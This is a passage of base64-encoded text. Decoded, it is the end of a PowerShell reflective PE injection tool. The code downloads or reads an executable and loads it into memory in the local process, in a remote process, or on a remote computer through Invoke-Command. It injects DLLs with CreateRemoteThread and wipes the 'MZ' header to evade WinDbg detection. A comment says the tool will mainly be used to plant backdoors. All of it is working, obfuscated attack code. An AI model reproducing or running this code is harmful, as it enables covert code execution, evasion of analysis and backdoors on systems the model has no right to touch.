CAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuRnJlZUxpYnJhcnkuSW52b2tlKCRJbXBvcnREbGxIYW5kbGUpCiAgICAgICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJVbmFibGUgdG8gZnJlZSBsaWJyYXJ5OiAkSW1wb3J0RGxsUGF0aC4gQ29udGludWluZyBhbnl3YXlzLiIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEltcG9ydERlc2NyaXB0b3JQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgICNDYWxsIERsbE1haW4gd2l0aCBwcm9jZXNzIGRldGFjaAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZGxsbWFpbiBzbyB0aGUgRExMIGtub3dzIGl0IGlzIGJlaW5nIHVubG9hZGVkIgogICAgICAgICREbGxNYWluUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKICAgICAgICAkRGxsTWFpbkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbQm9vbF0pCiAgICAgICAgJERsbE1haW4gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkRGxsTWFpblB0ciwgJERsbE1haW5EZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICAkRGxsTWFpbi5JbnZva2UoJFBFSW5mby5QRUhhbmRsZSwgMCwgW0ludFB0cl06Olplcm8pIHwgT3V0LU51bGwKICAgICAgICAKICAgICAgICAKICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZS5JbnZva2UoJFBFSGFuZGxlLCBbVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkKICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBjYWxsIFZpcnR1YWxGcmVlIG9uIHRoZSBQRSdzIG1lbW9yeS4gQ29udGludWluZyBhbnl3YXlzLiIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICB9CiAgICB9CgoKICAgIEZ1bmN0aW9uIE1haW4KICAgIHsKICAgICAgICAkV2luMzJGdW5jdGlvbnMgPSBHZXQtV2luMzJGdW5jdGlvbnMKICAgICAgICAkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzID0gIEdldC1XaW4zMkNvbnN0YW50cwogICAgICAgIAogICAgICAgICRSZW1vdGVQcm9jSGFuZGxlID0gW0ludFB0cl06Olplcm8KICAgIAogICAgICAgICNJZiBhIHJlbW90ZSBwcm9jZXNzIHRvIGluamVjdCBpbiB0byBpcyBzcGVjaWZpZWQsIGdldCBhIGhhbmRsZSB0byBpdAogICAgICAgIGlmICgoJFByb2NJZCAtbmUgJG51bGwpIC1hbmQgKCRQcm9jSWQgLW5lIDApIC1hbmQgKCRQcm9jTmFtZSAtbmUgJG51bGwpIC1hbmQgKCRQcm9jTmFtZSAtbmUgIiIpKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkNhbid0IHN1cHBseSBhIFByb2NJZCBhbmQgUHJvY05hbWUsIGNob29zZSBvbmUgb3IgdGhlIG90aGVyIgogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQcm9jTmFtZSAtbmUgJG51bGwgLWFuZCAkUHJvY05hbWUgLW5lICIiKQogICAgICAgIHsKICAgICAgICAgICAgJFByb2Nlc3NlcyA9IEAoR2V0LVByb2Nlc3MgLU5hbWUgJFByb2NOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKQogICAgICAgICAgICBpZiAoJFByb2Nlc3Nlcy5Db3VudCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNhbid0IGZpbmQgcHJvY2VzcyAkUHJvY05hbWUiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkUHJvY2Vzc2VzLkNvdW50IC1ndCAxKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHJvY0luZm8gPSBHZXQtUHJvY2VzcyB8IHdoZXJlIHsgJF8uTmFtZSAtZXEgJFByb2NOYW1lIH0gfCBTZWxlY3QtT2JqZWN0IFByb2Nlc3NOYW1lLCBJZCwgU2Vzc2lvbklkCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgJFByb2NJbmZvCiAgICAgICAgICAgICAgICBUaHJvdyAiTW9yZSB0aGFuIG9uZSBpbnN0YW5jZSBvZiAkUHJvY05hbWUgZm91bmQsIHBsZWFzZSBzcGVjaWZ5IHRoZSBwcm9jZXNzIElEIHRvIGluamVjdCBpbiB0by4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHJvY0lkID0gJFByb2Nlc3Nlc1swXS5JRAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgICNKdXN0IHJlYWxpemVkIHRoYXQgUG93ZXJTaGVsbCBsYXVuY2hlcyB3aXRoIFNlRGVidWdQcml2aWxlZ2UgZm9yIHNvbWUgcmVhc29uLi4gU28gdGhpcyBpc24ndCBuZWVkZWQuIEtlZXBpbmcgaXQgYXJvdW5kIGp1c3QgaW5jYXNlIGl0IGlzIG5lZWRlZCBpbiB0aGUgZnV0dXJlLgogICAgICAgICNJZiB0aGUgc2NyaXB0IGlzbid0IHJ1bm5pbmcgaW4gdGhlIHNhbWUgV2luZG93cyBsb2dvbiBzZXNzaW9uIGFzIHRoZSB0YXJnZXQsIGdldCBTZURlYnVnUHJpdmlsZWdlCiMgICAgICAgaWYgKChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuU2Vzc2lvbklkIC1uZSAoR2V0LVByb2Nlc3MgLUlkICRQcm9jSWQpLlNlc3Npb25JZCkKIyAgICAgICB7CiMgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkdldHRpbmcgU2VEZWJ1Z1ByaXZpbGVnZSIKIyAgICAgICAgICAgRW5hYmxlLVNlRGVidWdQcml2aWxlZ2UgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiMgICAgICAgfSAgIAogICAgICAgIAogICAgICAgIGlmICgoJFByb2NJZCAtbmUgJG51bGwpIC1hbmQgKCRQcm9jSWQgLW5lIDApKQogICAgICAgIHsKICAgICAgICAgICAgJFJlbW90ZVByb2NIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuT3BlblByb2Nlc3MuSW52b2tlKDB4MDAxRjBGRkYsICRmYWxzZSwgJFByb2NJZCkKICAgICAgICAgICAgaWYgKCRSZW1vdGVQcm9jSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IG9idGFpbiB0aGUgaGFuZGxlIGZvciBwcm9jZXNzIElEOiAkUHJvY0lkIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJHb3QgdGhlIGhhbmRsZSBmb3IgdGhlIHJlbW90ZSBwcm9jZXNzIHRvIGluamVjdCBpbiB0byIKICAgICAgICB9CiAgICAgICAgCgogICAgICAgICNMb2FkIHRoZSBQRSByZWZsZWN0aXZlbHkKICAgICAgICBXcml0ZS1WZXJib3NlICJDYWxsaW5nIEludm9rZS1NZW1vcnlMb2FkTGlicmFyeSIKICAgICAgICAkUEVIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICAkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUgogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkUEVMb2FkZWRJbmZvID0gSW52b2tlLU1lbW9yeUxvYWRMaWJyYXJ5IC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICRFeGVBcmdzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1Gb3JjZUFTTFIgJEZvcmNlQVNMUgogICAgICAgIH0KICAgICAgICBpZiAoJFBFTG9hZGVkSW5mbyAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxvYWQgUEUsIGhhbmRsZSByZXR1cm5lZCBpcyBOVUxMIgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkUEVIYW5kbGUgPSAkUEVMb2FkZWRJbmZvWzBdCiAgICAgICAgJFJlbW90ZVBFSGFuZGxlID0gJFBFTG9hZGVkSW5mb1sxXSAjb25seSBtYXR0ZXJzIGlmIHlvdSBsb2FkZWQgaW4gdG8gYSByZW1vdGUgcHJvY2VzcwogICAgICAgIAogICAgICAgIAogICAgICAgICNDaGVjayBpZiBFWEUgb3IgRExMLiBJZiBFWEUsIHRoZSBlbnRyeSBwb2ludCB3YXMgYWxyZWFkeSBjYWxsZWQgYW5kIHdlIGNhbiBub3cgcmV0dXJuLiBJZiBETEwsIGNhbGwgdXNlciBmdW5jdGlvbi4KICAgICAgICAkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgIGlmICgoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKSAtYW5kICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pKQogICAgICAgIHsKICAgICAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAgICAgIyMjIFlPVVIgQ09ERSBHT0VTIEhFUkUKICAgICAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAgICAgc3dpdGNoICgkRnVuY1JldHVyblR5cGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICdXU3RyaW5nJyB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBmdW5jdGlvbiB3aXRoIFdTdHJpbmcgcmV0dXJuIHR5cGUiCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kV1N0cmluZ0Z1bmNBZGRyID0gR2V0LU1lbW9yeVByb2NBZGRyZXNzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLUZ1bmN0aW9uTmFtZSAiV1N0cmluZ0Z1bmMiCiAgICAgICAgICAgICAgICAgICAgaWYgKCRXU3RyaW5nRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRXU3RyaW5nRnVuY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQogICAgICAgICAgICAgICAgICAgICRXU3RyaW5nRnVuYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXU3RyaW5nRnVuY0FkZHIsICRXU3RyaW5nRnVuY0RlbGVnYXRlKQogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJE91dHB1dFB0ciA9ICRXU3RyaW5nRnVuYy5JbnZva2UoKQogICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ1VuaSgkT3V0cHV0UHRyKQogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkT3V0cHV0CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJ1N0cmluZycgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZnVuY3Rpb24gd2l0aCBTdHJpbmcgcmV0dXJuIHR5cGUiCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kU3RyaW5nRnVuY0FkZHIgPSBHZXQtTWVtb3J5UHJvY0FkZHJlc3MgLVBFSGFuZGxlICRQRUhhbmRsZSAtRnVuY3Rpb25OYW1lICJTdHJpbmdGdW5jIgogICAgICAgICAgICAgICAgICAgIGlmICgkU3RyaW5nRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIkNvdWxkbid0IGZpbmQgZnVuY3Rpb24gYWRkcmVzcy4iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRTdHJpbmdGdW5jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCiAgICAgICAgICAgICAgICAgICAgJFN0cmluZ0Z1bmMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkU3RyaW5nRnVuY0FkZHIsICRTdHJpbmdGdW5jRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kT3V0cHV0UHRyID0gJFN0cmluZ0Z1bmMuSW52b2tlKCkKICAgICAgICAgICAgICAgICAgICAkT3V0cHV0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRPdXRwdXRQdHIpCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRPdXRwdXQKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAnVm9pZCcgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZnVuY3Rpb24gd2l0aCBWb2lkIHJldHVybiB0eXBlIgogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlZvaWRGdW5jIgogICAgICAgICAgICAgICAgICAgIGlmICgkVm9pZEZ1bmNBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRocm93ICJDb3VsZG4ndCBmaW5kIGZ1bmN0aW9uIGFkZHJlc3MuIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkVm9pZEZ1bmNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbVm9pZF0pCiAgICAgICAgICAgICAgICAgICAgJFZvaWRGdW5jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZvaWRGdW5jQWRkciwgJFZvaWRGdW5jRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAgICAgJFZvaWRGdW5jLkludm9rZSgpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgICAgICAjIyMgRU5EIE9GIFlPVVIgQ09ERQogICAgICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgIH0KICAgICAgICAjRm9yIHJlbW90ZSBETEwgaW5qZWN0aW9uLCBjYWxsIGEgdm9pZCBmdW5jdGlvbiB3aGljaCB0YWtlcyBubyBwYXJhbWV0ZXJzCiAgICAgICAgZWxzZWlmICgoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKSAtYW5kICgkUmVtb3RlUHJvY0hhbmRsZSAtbmUgW0ludFB0cl06Olplcm8pKQogICAgICAgIHsKICAgICAgICAgICAgJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlZvaWRGdW5jIgogICAgICAgICAgICBpZiAoKCRWb2lkRnVuY0FkZHIgLWVxICRudWxsKSAtb3IgKCRWb2lkRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlZvaWRGdW5jIGNvdWxkbid0IGJlIGZvdW5kIGluIHRoZSBETEwiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRWb2lkRnVuY0FkZHIgPSBTdWItU2lnbmVkSW50QXNVbnNpZ25lZCAkVm9pZEZ1bmNBZGRyICRQRUhhbmRsZQogICAgICAgICAgICAkVm9pZEZ1bmNBZGRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFZvaWRGdW5jQWRkciAkUmVtb3RlUEVIYW5kbGUKICAgICAgICAgICAgCiAgICAgICAgICAgICNDcmVhdGUgdGhlIHJlbW90ZSB0aHJlYWQsIGRvbid0IHdhaXQgZm9yIGl0IHRvIHJldHVybi4uIFRoaXMgd2lsbCBwcm9iYWJseSBtYWlubHkgYmUgdXNlZCB0byBwbGFudCBiYWNrZG9vcnMKICAgICAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFZvaWRGdW5jQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCiAgICAgICAgfQogICAgICAgIAogICAgICAgICNEb24ndCBmcmVlIGEgbGlicmFyeSBpZiBpdCBpcyBpbmplY3RlZCBpbiBhIHJlbW90ZSBwcm9jZXNzIG9yIGlmIGl0IGlzIGFuIEVYRS4KICAgICAgICAjTm90ZSB0aGF0IGFsbCBETEwncyBsb2FkZWQgYnkgdGhlIEVYRSB3aWxsIHJlbWFpbiBsb2FkZWQgaW4gbWVtb3J5LgogICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8gLWFuZCAkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpCiAgICAgICAgewogICAgICAgICAgICBJbnZva2UtTWVtb3J5RnJlZUxpYnJhcnkgLVBFSGFuZGxlICRQRUhhbmRsZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAjRGVsZXRlIHRoZSBQRSBmaWxlIGZyb20gbWVtb3J5LgogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZS5JbnZva2UoJFBFSGFuZGxlLCBbVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBjYWxsIFZpcnR1YWxGcmVlIG9uIHRoZSBQRSdzIG1lbW9yeS4gQ29udGludWluZyBhbnl3YXlzLiIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJEb25lISIKICAgIH0KCiAgICBNYWluCn0KCiNNYWluIGZ1bmN0aW9uIHRvIGVpdGhlciBydW4gdGhlIHNjcmlwdCBsb2NhbGx5IG9yIHJlbW90ZWx5CkZ1bmN0aW9uIE1haW4KewogICAgaWYgKCgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siRGVidWciXSAtbmUgJG51bGwpIC1hbmQgJFBTQ21kbGV0Lk15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnNbIkRlYnVnIl0uSXNQcmVzZW50KQogICAgewogICAgICAgICREZWJ1Z1ByZWZlcmVuY2UgID0gIkNvbnRpbnVlIgogICAgfQogICAgCiAgICBXcml0ZS1WZXJib3NlICJQb3dlclNoZWxsIFByb2Nlc3NJRDogJFBJRCIKICAgIAogICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1pZXEgIkxvY2FsRmlsZSIpCiAgICB7CiAgICAgICAgR2V0LUNoaWxkSXRlbSAkUEVQYXRoIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICBbQnl0ZVtdXSRQRUJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKChSZXNvbHZlLVBhdGggJFBFUGF0aCkpCiAgICB9CiAgICBlbHNlaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1pZXEgIldlYkZpbGUiKQogICAgewogICAgICAgICRXZWJDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAgICAgCiAgICAgICAgW0J5dGVbXV0kUEVCeXRlcyA9ICRXZWJDbGllbnQuRG93bmxvYWREYXRhKCRQRVVybCkKICAgIH0KICAgIGVsc2V7CiAgICAgICAgW0J5dGVbXV0kUEVCeXRlcyA9IFtCeXRlW11dW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRQRWJhc2U2NCkKICAgIH0KICAgIAogICAgI1ZlcmlmeSB0aGUgaW1hZ2UgaXMgYSB2YWxpZCBQRSBmaWxlCiAgICAkZV9tYWdpYyA9ICgkUEVCeXRlc1swLi4xXSB8ICUge1tDaGFyXSAkX30pIC1qb2luICcnCgogICAgaWYgKCRlX21hZ2ljIC1uZSAnTVonKQogICAgewogICAgICAgIHRocm93ICdQRSBpcyBub3QgYSB2YWxpZCBQRSBmaWxlLicKICAgIH0KCiAgICAjIFJlbW92ZSAnTVonIGZyb20gdGhlIFBFIGZpbGUgc28gdGhhdCBpdCBjYW5ub3QgYmUgZGV0ZWN0ZWQgYnkgLmltZ3NjYW4gaW4gV2luRGJnCiAgICAjIFRPRE86IEludmVzdGlnYXRlIGhvdyBtdWNoIG9mIHRoZSBoZWFkZXIgY2FuIGJlIGRlc3Ryb3llZCwgSSdkIGltYWdpbmUgbW9zdCBvZiBpdCBjYW4gYmUuCiAgICAkUEVCeXRlc1swXSA9IDAKICAgICRQRUJ5dGVzWzFdID0gMAogICAgCiAgICAjQWRkIGEgInByb2dyYW0gbmFtZSIgdG8gZXhlYXJncywganVzdCBzbyB0aGUgc3RyaW5nIGxvb2tzIGFzIG5vcm1hbCBhcyBwb3NzaWJsZSAocmVhbCBhcmdzIHN0YXJ0IGluZGV4aW5nIGF0IDEpCiAgICBpZiAoJEV4ZUFyZ3MgLW5lICRudWxsIC1hbmQgJEV4ZUFyZ3MgLW5lICcnKQogICAgewogICAgICAgICRFeGVBcmdzID0gIlJlZmxlY3RpdmVFeGUgJEV4ZUFyZ3MiCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJEV4ZUFyZ3MgPSAiUmVmbGVjdGl2ZUV4ZSIKICAgIH0KCiAgICBpZiAoJENvbXB1dGVyTmFtZSAtZXEgJG51bGwgLW9yICRDb21wdXRlck5hbWUgLWltYXRjaCAiXlxzKiQiKQogICAgewogICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkUmVtb3RlU2NyaXB0QmxvY2sgLUFyZ3VtZW50TGlzdCBAKCRQRUJ5dGVzLCAkRnVuY1JldHVyblR5cGUsICRQcm9jSWQsICRQcm9jTmFtZSwkRm9yY2VBU0xSKQogICAgfQogICAgZWxzZQogICAgewogICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkUmVtb3RlU2NyaXB0QmxvY2sgLUFyZ3VtZW50TGlzdCBAKCRQRUJ5dGVzLCAkRnVuY1JldHVyblR5cGUsICRQcm9jSWQsICRQcm9jTmFtZSwkRm9yY2VBU0xSKSAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgIH0KfQoKTWFpbgp9
